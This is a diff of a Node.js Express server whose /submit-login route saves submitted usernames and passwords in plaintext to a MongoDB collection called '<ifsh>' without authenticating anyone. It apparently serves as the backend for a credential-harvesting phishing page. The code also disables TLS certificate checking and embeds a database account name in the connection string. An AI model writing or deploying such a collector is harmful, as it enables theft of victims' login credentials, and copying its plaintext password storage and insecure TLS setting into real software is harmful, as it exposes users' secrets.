@@ -4,24 +4,26 @@ const fs = require('fs');
 const path = require('path');
 
 const app = express();
-const PORT = process.env.PORT || 3000; // Use Render's PORT environment variable
+const PORT = process.env.PORT || 3000;
 
 const { MongoClient } = require('mongodb');
 
-const uri = "mongodb+srv://garycantilang:<db_password>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&ssl=true&tlsInsecure=true"; // Replace with your connection string
+const uri = "mongodb+srv://garycantilang:<db_password>@cluster0.cygdj.mongodb.net/?retryWrites=true&w=majority&ssl=true&tlsInsecure=true";
 const client = new MongoClient(uri);
+
+let db; // Declare the db variable
 
 async function connectToDatabase() {
     try {
-      await client.connect();
-      console.log("Connected to MongoDB");
-      // Access your database with client.db('<database_name>')
+        await client.connect();
+        db = client.db('<logdata>'); // Assign your database name here
+        console.log("Connected to MongoDB");
     } catch (error) {
-      console.error("MongoDB connection error:", error);
+        console.error("MongoDB connection error:", error);
     }
-  }
-  
-  connectToDatabase();
+}
+
+connectToDatabase();
 
 // Middleware to parse form data
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -30,11 +32,10 @@ app.use(express.static(__dirname)); // Serve static files from the "public" dire
 // Route to handle login form submission
 app.post('/submit-login', async (req, res) => {
     const { username, password } = req.body;
-    const data = `Username: ${username}, Password: ${password}\n`; // Format the data to save
 
     try {
-        const loginData = { username, password, timestamp: new Date() }; // Include a timestamp
-        await db.collection('<ifsh>').insertOne(loginData); // Replace with your collection name
+        const loginData = { username, password, timestamp: new Date() };
+        await db.collection('<ifsh>').insertOne(loginData); // Replace '<ifsh>' with your collection name
         res.send('Login information saved successfully to MongoDB.');
     } catch (error) {
         console.error('Error saving data to MongoDB:', error);
